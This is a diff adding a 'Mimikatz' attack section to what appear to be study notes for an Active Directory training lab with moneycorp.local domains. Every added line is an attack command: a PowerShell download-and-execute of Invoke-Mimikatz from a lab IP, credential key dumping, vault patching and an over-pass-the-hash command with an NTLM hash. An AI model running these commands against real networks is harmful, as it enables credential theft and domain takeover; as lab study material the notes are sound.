@@ -113,3 +113,21 @@ Get-NetDomainController -Domain moneycorp.local
 ```
 
 ### Attack
+
+#### Mimikatz
+```powershell
+iex (iwr http://172.16.100.X/Invoke-Mimikatz.ps1 -UseBasicParsing)
+```
+Get AES keys
+```powershell
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+```
+Inspect credentials vault
+```powershell
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
+```
+NTLM domain admin used to create a token and run powershell (over pass the hash)
+```powershell
+. .\Invoke-Mimikatz.ps1
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'
+```
